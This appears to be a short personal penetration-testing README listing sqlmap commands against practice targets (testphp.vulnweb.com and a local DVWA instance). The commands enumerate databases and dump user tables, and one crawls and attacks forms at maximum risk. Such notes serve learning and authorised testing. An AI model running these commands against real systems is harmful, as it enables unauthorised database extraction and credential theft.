# SQLMAP Payloads
```
python sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1
python sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1 --dbs
python sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1 --tables
python sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1 --columns -D information_schema -T USER_PRIVILEGES
python sqlmap.py -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id --dbs
python sqlmap.py -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id -D dvwa --tables --batch --threads 5
python sqlmap.py -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id -T users --batch --threads 5 --dump
python sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1 --dump -D information_schema -T USER_PRIVILEGES
python sqlmap.py -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```
# Note
This is repo for my documentation if I perform penetration testing sql injection in web application using SQLMAP tool.
